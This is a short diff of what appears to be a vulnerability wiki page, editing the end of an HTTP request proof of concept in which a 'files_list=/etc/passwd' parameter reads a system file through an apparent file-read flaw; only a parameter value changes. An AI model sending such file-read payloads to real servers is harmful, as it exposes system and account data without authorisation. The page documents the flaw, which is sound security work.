@@ -50,7 +50,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
 Cookie: lang=en; PHPSESSID=bvib0lq6lahlhbjnfv91k13ou0
 
-name=pq&files_list=/etc/passwd
+name=test&files_list=/etc/passwd
 ```
 
 ![](http://wikioss.peiqi.tech/vuln/sel-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
